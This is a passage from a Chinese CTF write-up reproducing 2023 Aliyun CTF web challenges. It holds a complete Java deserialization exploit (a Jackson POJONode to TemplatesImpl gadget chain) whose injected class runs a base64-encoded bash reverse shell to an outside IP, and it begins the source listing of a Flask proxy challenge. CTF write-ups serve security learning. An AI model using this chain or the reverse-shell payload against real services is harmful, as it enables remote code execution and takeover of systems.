class="token punctuation">&#123;</span>          <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>          oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>          oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>          field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Bypassit-I"><a href="#Bypassit-I" class="headerlink" title="Bypassit I"></a>Bypassit I</h2><p>先看路由</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/bypass1Controller.png" class=""><p>让我们直接用 curl 传输 <code>.ser</code> 文件去打，接着看依赖，依赖中有个 jackson，jackson 和 fastjson 用起来差不多，所以这里的链子思路应该是：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span>toString <span class="token operator">-></span> <span class="token class-name">POJONode</span> <span class="token operator">-></span> getter <span class="token operator">-></span> <span class="token class-name">TemplatesImpl</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由此构造 EXP</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>bypassit</span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span></span><span class="token class-name">POJONode</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span></span><span class="token class-name">XString</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Array</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EXP</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>          <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"Drunkbaby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"new String[]&#123;\"/bin/bash\", \"-c\", \"&#123;echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMjQuMjIyLjIxLjEzOC8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecodes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> bytecodes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">POJONode</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"size"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> nodeC<span class="token punctuation">;</span>          nodeC <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Node"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> nodeCons <span class="token operator">=</span> nodeC<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> nodeC<span class="token punctuation">)</span><span class="token punctuation">;</span>          nodeCons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Object</span> tbl <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>nodeC<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">XString</span> xString <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"xx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">HashMap</span> map1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">HashMap</span> map2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          map1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>          map1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> xString<span class="token punctuation">)</span><span class="token punctuation">;</span>          map2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> xString<span class="token punctuation">)</span><span class="token punctuation">;</span>          map2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> map1<span class="token punctuation">,</span> map1<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> map2<span class="token punctuation">,</span> map2<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"table"</span><span class="token punctuation">,</span> tbl<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">serialize</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Field</span> field <span class="token operator">=</span> object<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>          field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token class-name">Filename</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>          <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token class-name">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> obj<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span> cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>              <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token class-name">CtClass</span> superClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClass<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">" try &#123;\n"</span> <span class="token operator">+</span>                      <span class="token string">" Runtime.getRuntime().exec(\""</span> <span class="token operator">+</span> cmd <span class="token operator">+</span>                      <span class="token string">"\");\n"</span> <span class="token operator">+</span>                      <span class="token string">" &#125; catch (Exception ignored) &#123;\n"</span> <span class="token operator">+</span>                      <span class="token string">" &#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> bytes<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>遗憾的是这些 Java 题目似乎环境都已经关闭了</p><h2 id="Door-gap-（门缝）"><a href="#Door-gap-（门缝）" class="headerlink" title="Door gap （门缝）"></a>Door gap （门缝）</h2><p>直接访问 <a class="link"   href="http://ip/" >http://118.178.238.83:8000/<i class="fas fa-external-link-alt"></i></a> 可以看到源码，得到以下信息</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/env python  </span><span class="token keyword">import</span> json  <span class="token keyword">import</span> math  <span class="token keyword">from</span> ipaddress <span class="token keyword">import</span> ip_network<span class="token punctuation">,</span> ip_address  <span class="token keyword">import</span> io  <span class="token keyword">import</span> traceback  <span class="token keyword">import</span> requests  <span class="token keyword">import</span> http<span class="token punctuation">.</span>client  <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse  <span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask  <span class="token keyword">from</span> flask <span class="token keyword">import</span> request  <span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>middleware<span class="token punctuation">.</span>proxy_fix <span class="token keyword">import</span> ProxyFix  <span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> NotFound  <span class="token keyword">import</span> socket   <span class="token keyword">import</span> cachetools      app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>  <span class="token comment"># TODO: need to publish this service via api gateway at http://172.18.19.3:8000/admin/  </span>app<span class="token punctuation">.</span>wsgi_app <span class="token operator">=</span> ProxyFix<span class="token punctuation">(</span>      app<span class="token punctuation">.</span>wsgi_app<span class="token punctuation">,</span> x_for<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> x_proto<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> x_host<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> x_prefix<span class="token operator">=</span><span class="token number">1</span>  <span class="token punctuation">)</span>  <span class="token comment"># app.logger.setLevel(logging.INFO)  </span>  private_networks <span class="token operator">=</span> <span class="token punctuation">[</span>      ip_network<span class="token punctuation">(</span><span class="token string">"10.0.0.0/8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      ip_network<span class="token punctuation">(</span><span class="token string">"172.16.0.0/12"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      ip_network<span class="token punctuation">(</span><span class="token string">"192.168.0.0/16"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      ip_network<span class="token punctuation">(</span><span class="token string">"127.0.0.0/8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      ip_network<span class="token punctuation">(</span><span class="token string">"100.100.100.200/32"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      ip_network<span class="token punctuation">(</span><span class="token string">"0.0.0.0/32"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      ip_network<span class="token punctuation">(</span><span class="token string">"::1/128"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      ip_network<span class="token punctuation">(</span><span class="token string">"::/128"</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span>    OriginalResponse <span class="token operator">=</span> http<span class="token punctuation">.</span>client<span class="token punctuation">.</span>HTTPResponse      <span class="token keyword">class</span> <span class="token class-name">CustomHttpResponse</span><span class="token punctuation">(</span>OriginalResponse<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">def</span> __init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> sock<span class="token punctuation">,</span> debuglevel<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> url<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> debuglevel<span class="token punctuation">,</span> method<span class="token punctuation">,</span> url<span class="token punctuation">)</span>          self<span class="token punctuation">.</span>raw_resp <span class="token operator">=</span> <span class="token string">b''</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>              <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                  _data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span>                  <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>_data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                      <span class="token keyword">break</span>                  self<span class="token punctuation">.</span>raw_resp <span class="token operator">+=</span> _data                  sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>          <span class="token keyword">except</span><span class="token punctuation">:</span>              <span class="token keyword">pass</span>          sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>fp <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>self<span class="token punctuation">.</span>raw_resp<span class="token punctuation">)</span>      http<span class="token punctuation">.</span>client<span class="token punctuation">.</span>HTTPConnection<span class="token punctuation">.</span>response_class <span class="token operator">=</span> CustomHttpResponse      host_cache <span class="token operator">=</span> cachetools<span class="token punctuation">.</span>TTLCache<span class="token punctuation">(</span>maxsize<span class="token operator">=</span>math<span class="token punctuation">.</span>inf<span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>      <span class="token keyword">def</span> custom_gethostbyname<span class="token punctuation">(</span>hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">try</span><span class="token punctuation">:</span>          <span class="token keyword">return</span> host_cache<span class="token punctuation">[</span>hostname<span class="token punctuation">]</span>      <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>          address <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>hostname<span class="token punctuation">)</span>          host_cache<span class="token punctuation">[</span>hostname<span class="token punctuation">]</span> <span class="token operator">=</span> address          <span class="token keyword">return</span> address      original_getaddrinfo <span class="token operator">=</span> socket<span class="token punctuation">.</span>getaddrinfo      <span class="token keyword">def</span> new_getaddrinfo<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>      host <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>      <span class="token keyword">try</span><span class="token punctuation">:</span>          ip_address<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token keyword">return</span> original_getaddrinfo<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span>      <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>          new_args <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>          new_args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> custom_gethostbyname<span class="token punctuation">(</span>host<span class="token punctuation">)</span>          <span class="token keyword">return</span> original_getaddrinfo<span class="token punctuation">(</span><span class="token operator">*</span>new_args<span class="token punctuation">)</span>      socket<span class="token punctuation">.</span>getaddrinfo <span class="token operator">=</span> new_getaddrinfo      <span class="token keyword">def</span> get_file<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>      fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>      ret <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>      fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> ret      <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/proxy'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> proxy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Check source addr, this is a private api  </span>    <span class="token keyword">if</span> <span class="token keyword">not</span> ip_address<span class="token punctuation">(</span>request<span class="token punctuation">.</span>remote_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>is_private<span class="token punctuation">:</span>          <span class="token keyword">return</span> <span class="token 